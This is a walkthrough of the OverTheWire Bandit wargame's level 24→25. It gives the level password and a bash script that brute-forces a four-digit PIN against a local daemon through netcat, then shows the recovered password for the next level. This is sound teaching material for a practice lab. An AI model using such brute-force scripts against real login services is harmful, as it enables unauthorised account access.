---
layout: default
title: Level 24 → Level 25
order: 25
---

# Level 24 → Level 25
After logging in with 

`ssh bandit24@bandit.labs.overthewire.org -p 2220`

Password: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

the game tells us that a daemon is listening on port 30002 that will print back the password for bandit25 if given the password for bandit 24 followed by a 4 digit pin-code (that we will have to bruteforce). 

Let's look at the script the daemon is running by connecting via netcat like we did in [Level 14 → Level 15]({{ site.baseurl }}/bandit/level-14_to_level-15):

`nc localhost 30002`

This will return the script's description:

```
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```

This means that we need to write a script that sends the password for bandit24 and the secret pincode (a number between 0000 and 9999), separated by a space. To do this, let's move into a temporary directory `cd /tmp` first, then `mktemp -d` and `cd /tmp.9dtiJmbqOqand` (where 9dtiJmbqOq is the name of your temporary directory). Then create a `bruteforce.sh` file with `touch bruteforce.sh` and edit it with `nano bruteforce.sh`. 

Let's write our script:

```
#!/bin/bash

for i in {0000..9999}
do
    echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> tries.txt
done

cat tries.txt | nc localhost 30002 > res.txt
```

Remember to put your password for bandit24 as it will change.

This will print all combinations inside `tries.txt`, then write all outcomes in `res.txt`. Let's give this file esecuting permissions with `chmod +x bruteforce.sh`, then run it.

By running `ls` we instantly see that the `tries.txt` and `res.txt` have been created.

By using `cat res.txt` we can see that all failed attempts return the same message: 

```
Wrong! Please enter the correct current password and pincode. Try again.
```

This means that we can get the password by using sort, just like we did in [Level 8 → Level 9]({{ site.baseurl }}/bandit/level-8_to_level-9) and grep, like we did in [Level 7 → Level 8]({{ site.baseurl }}/bandit/level-7_to_level-8) to filter out lines that contain a certain word:

```
sort res.txt | grep -v "again"
```

or we could also use uniq -u, as we did, again, in [Level 7 → Level 8]({{ site.baseurl }}/bandit/level-7_to_level-8)

```
uniq -u res.txt
```

`sort` will return:

```
Correct!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

while uniq -u will return:

```
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

in both cases the password for our next level will be:

> `iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`
